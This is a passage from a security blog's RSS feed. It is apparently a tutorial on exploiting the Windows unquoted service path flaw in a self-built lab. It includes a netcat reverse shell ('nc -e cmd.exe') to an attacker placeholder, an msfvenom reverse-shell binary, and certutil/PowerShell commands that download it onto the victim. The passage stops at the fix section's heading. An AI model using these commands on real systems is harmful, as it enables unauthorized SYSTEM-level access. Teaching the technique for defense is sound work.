        <pubDate>Tue, 28 Dec 2021 08:40:00 +0000</pubDate>
        <link>http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/2021/12/28/thm-alfred-ctf-writeup/</guid>
        
        <category>TryHackme Machines</category>
        
        <category>ctf</category>
        
        <category>pentesting</category>
        
        <category>metasploit</category>
        
        <category>mindows-privesc</category>
        
        <category>windows-tokens</category>
        
        <category>bruteforce</category>
        
        <category>remote-code-execution</category>
        
        <category>jenkins</category>
        
        
      </item>
    
      <item>
        <title>Unquoted Service Path Vulnerability</title>
        <description>&lt;h1 id=&quot;what-is-unquoted-service-path-&quot;&gt;What is Unquoted Service Path ?&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; is a vulnerability occurs when a service is created with a service path without appropriate quote surroundings. 
In addition to this implementation mistake, if the string value of the service path contains spaces, 
that vulnerability can end up with a privilege escalation for the attacker with the permissions of whoever created the service.&lt;/p&gt;

&lt;h1 id=&quot;how-it-works&quot;&gt;How it works?&lt;/h1&gt;

&lt;p&gt;Typically &lt;a href=&quot;https://en.wikipedia.org/wiki/Service_Control_Manager&quot;&gt;&lt;strong&gt;Service Control Manager&lt;/strong&gt;&lt;/a&gt; will run the service’s executable
by looking at its full path.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Path of the safe service -&amp;gt; “C:\Program Files\a folder\b folder\c folder\vulnservice.exe”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The service control manager will execute vulnservice.exe due to the fact that the path has appropriate quoting. 
&lt;br /&gt;Basically, the system will interpret the path as a full string. 
&lt;br /&gt;
&lt;br /&gt;
However, if the full path of the service file is not enclosed within quotation marks just like the following example, things are
getting tricky:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Path of the vulnerable service -&amp;gt; C:\Program Files\a folder\b folder\c folder\vulnservice.exe&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This time, for each space in the path, the system will append the &lt;strong&gt;.exe&lt;/strong&gt; extension at the end of the most recent 
space. Thus the first string chunk of the folder name will be treated as an executable.
&lt;br /&gt;Interpretation would be as following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;C:\&lt;strong&gt;Program.exe&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;C:\Program Files\&lt;strong&gt;a.exe&lt;/strong&gt; : If Progam.exe does not exist, execute a.exe&lt;/li&gt;
  &lt;li&gt;C:\Program Files\a folder\&lt;strong&gt;b.exe&lt;/strong&gt; : If a.exe does not exist, execute b.exe&lt;/li&gt;
  &lt;li&gt;C:\Program Files\a folder\b folder\&lt;strong&gt;c.exe&lt;/strong&gt; : If b.exe does not exist, execute c.exe&lt;/li&gt;
  &lt;li&gt;C:\Program Files\a folder\b folder\c folder\&lt;strong&gt;vulnservice.exe&lt;/strong&gt; : If c.exe does not exist, execute vulnservice.exe&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;how-to-exploit-it-&quot;&gt;How to exploit it ?&lt;/h1&gt;

&lt;p&gt;Consider that you have gained a shell from a low privileged user in the system. However that user has the write permission
for one of these subfolders. Then you can deploy a malicious executable inside that subfolder by naming it with the the 
first string chunk of its child folder.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;Lets assume that the user that you have gained access to has the write permission for the b folder. If you create a malware 
named a.exe and drop it inside the b folder, the system will run your executable at the next run of the service.&lt;/p&gt;

&lt;h1 id=&quot;setting-the-lab&quot;&gt;Setting the Lab&lt;/h1&gt;

&lt;p&gt;In order to exploit the vulnerability, we need to create one.
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Open up the start menu, and launch a command prompt by running it as an administrator.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Create a low privileged user:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net user krygen krygen /add&lt;/code&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Press &lt;strong&gt;Win+R&lt;/strong&gt;, and run &lt;strong&gt;lusrmgr.src&lt;/strong&gt;, to see all users and groups in the system.
&lt;br /&gt;You can see the user krygen has been created successfully.
&lt;br /&gt;It is also possbile to run ‘&lt;strong&gt;net user krygen&lt;/strong&gt;’ to get same information from the command line.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
And the account belongs to the &lt;strong&gt;Users Group&lt;/strong&gt;.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
To create a vulnerable service run this command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vuln Service&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Proogram Files\a folder\b folder\c folder\vulnservice.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Displayname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vulnerable Service&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auto&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;sc.exe is the utility to create and interact with the services.&lt;/li&gt;
  &lt;li&gt;binpath is the path of the binary executable of the service.&lt;/li&gt;
  &lt;li&gt;Displayname is not mandatory, if you leave it blank, it will take the name of the service.&lt;/li&gt;
  &lt;li&gt;start is the start type, it can be either auto or manual.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt; We can see the details of any service by runnig ‘&lt;strong&gt;sc qc {SERVICE NAME}&lt;/strong&gt;’.
&lt;br /&gt;Important fields to notice:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;START_TYPE = AUTO_START -&amp;gt; Service will start automatically when the sytem boots.&lt;/li&gt;
  &lt;li&gt;SERVICE_START_NAME = LocalSystem -&amp;gt; Service will start with the LocalSystem service account privileges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;LocalSystem&lt;/strong&gt;&lt;/a&gt; is a 
service account, and it has the highest privileges of the system, which is the system root.
&lt;br /&gt; Read more about &lt;a href=&quot;https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco&quot;&gt;&lt;strong&gt;Microsoft Service Accounts&lt;/strong&gt;&lt;/a&gt;.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Let create directories which is declared as a path for our service.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder\b folder\c folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
As you can see, it is not possible to start the service since the there is no executable in path.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;I will create two executables, both will delete different txt files from a specified path.
&lt;br /&gt;One will delete &lt;strong&gt;burak.txt&lt;/strong&gt; and the other, &lt;strong&gt;krygen.txt&lt;/strong&gt;, for every 3 seconds.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Source code for vulnservice.exe&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Source code for b.exe&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
I have compiled both C codes with GCC and converted them into executables.
&lt;br /&gt;&lt;a href=&quot;https://sourceforge.net/projects/gcc-win64/&quot;&gt;&lt;strong&gt;Download gcc compiler&lt;/strong&gt;&lt;/a&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Put the &lt;strong&gt;vulnservice.exe&lt;/strong&gt; into the &lt;strong&gt;c folder&lt;/strong&gt;. When I start the service manually, starting from &lt;strong&gt;C:\&lt;/strong&gt;, the system will 
try to execute Program.exe then a.exe, then b.exe, then c.exe.However, none of them will be found. Thus vulnservice.exe will 
be executed as expected behaviour.
&lt;br /&gt;&lt;br /&gt;
Let run the service:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Vuln Service&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;First run: 0th second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;3rd second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Now put b.exe in a folder, then start the service again.
&lt;br /&gt;Remember the execution the we have discussed at the beginning.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;First run: 0th second&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
As you can see, this time krygen.txt had been deleted instead of burak.txt, which is catastrophic for the system,
but it was what we were expecting.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;3rd second&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;We have set the environment up. However, until now, we had access to admin privileges. Thus we were able to start the service 
manually and write any of the subdirectories of the service path.
&lt;br /&gt;As the name suggests &lt;strong&gt;privilege escalation&lt;/strong&gt;, is about raising our permissions to the LocalSystem/root permissions from
a lower privileged user. There is no point to exploit a vulnerability after you have complete control over the system.
&lt;br /&gt;&lt;br /&gt;
Let’s check the the &lt;a href=&quot;https://networkencyclopedia.com/access-control-list-acl/&quot;&gt;&lt;strong&gt;ACL(Access Control List)&lt;/strong&gt;&lt;/a&gt; of the ‘C:\Program Files\a folder’ with &lt;a href=&quot;https://www.techtarget.com/searchwindowsserver/definition/icacls&quot;&gt;&lt;strong&gt;icacls&lt;/strong&gt;&lt;/a&gt;. 
&lt;br /&gt;&lt;br /&gt;Run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;The Users Group entry, &lt;strong&gt;BUILTIN\Users:(I)(RX)&lt;/strong&gt;, gives access &lt;strong&gt;read&lt;/strong&gt; and &lt;strong&gt;execute&lt;/strong&gt; permissions 
for every user who belongs to &lt;strong&gt;Users Group&lt;/strong&gt;. The &lt;strong&gt;krygen&lt;/strong&gt; user we have created at the beginning of the 
post belongs to the Users Group. However, for the vulnerability to occur ,Users Group needs the &lt;strong&gt;write&lt;/strong&gt; 
permission for any of those subfolders, a,b or c, it does not matter which. For this example I will use &lt;strong&gt;a folder&lt;/strong&gt;.
&lt;br /&gt;Read more about &lt;a href=&quot;https://networkencyclopedia.com/discretionary-access-control-list-dacl/&quot;&gt;Security Descriptors&lt;/a&gt; and
&lt;a href=&quot;https://networkencyclopedia.com/discretionary-access-control-list-dacl/&quot;&gt;DACL&lt;/a&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Let us grant write access to Users Group for &lt;strong&gt;a folder&lt;/strong&gt;.
&lt;br /&gt;&lt;br /&gt;Run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/grant&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;BUILTIN\Users&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;W&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Then run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;icacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time you will see a new entry &lt;strong&gt;BUILTIN\Users:(W)&lt;/strong&gt;
&lt;br /&gt;&lt;br /&gt;Now the user we have created, krygen, can write to that specific directory.
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Log in to the system with the account that you have created which belongs to the Users Group, for me it is krygen user.
&lt;br /&gt;We will assume that, somehow you have gained accessed to the system as the user krygen.
&lt;br /&gt;I will use &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;
in order to establish a connection and take a shell from krygen to my attacker machine.
&lt;br /&gt;&lt;br /&gt;Run this on the attacker machine:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Run that on the windows machine:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OF&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACKER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MACHINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACKER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;MACHINE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LISTENS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Now that we have access to the krygen’s shell, we can try to write to all those a,b and c folders by attempting to create a 
new folder in each of them to test which one of them is accessible. We already know it is &lt;strong&gt;a folder&lt;/strong&gt;, no harm double-checking.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Folder creation is successfull inside ‘a folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Failed to create folder inside ‘b folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Failed to create folder inside ‘c folder’&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since the directory that we can write is the &lt;strong&gt;a folder&lt;/strong&gt;, if we want the service to execute our binary executable
instead of the service file, the name of the malicious executable should be the first chunk of the child directory, which is
&lt;strong&gt;b&lt;/strong&gt;.exe.
&lt;br /&gt;
I am going to use &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/Msfvenom/&quot;&gt;&lt;strong&gt;msfvenom&lt;/strong&gt;&lt;/a&gt; to create a reverse shell
binary back to my machine.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;LHOST&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The IP address that the reverse shell will connect&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The port that the reverse shell will connect&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Payload to use&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-o&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Name of the file&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-f&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;File type of the output binary&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Now we need to download the executable to the victim machine.
&lt;br /&gt;Run this in the directory that your executable locates. It will start a web server inside of that directory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;You can download any file from the running python server by using one of these utilites.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YOUR&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SERVER&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;YOU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WANT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TO&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DOWNLOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Double-check to see if the executable downloaded successfully into the directory to which you have the write access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on the port you declared in the reverse shell binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since we do not have &lt;strong&gt;LocalSystem&lt;/strong&gt; permissions, it is impossible to start the service manually. However, the start type of the 
service is &lt;strong&gt;AUTO_START&lt;/strong&gt;. Thus the service will be initialized at the system boot. All we have to do is reboot the system
and wait for the connection to establish.
&lt;br /&gt;Run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sutdown&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/r&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Hurray ! The connection has been established successfully, even though no login had not yet been attempted on the windows machine.
The path we are in is &lt;strong&gt;system32&lt;/strong&gt;, which means we have the console with administrator rights, 
have fun after that point :))).
&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;how-to-fix-it-&quot;&gt;How to fix it ?&lt;/h1&gt;

&lt;p&gt;First of all, run this to see if there is any service with an unquoted path variable.:&lt;/p&gt;

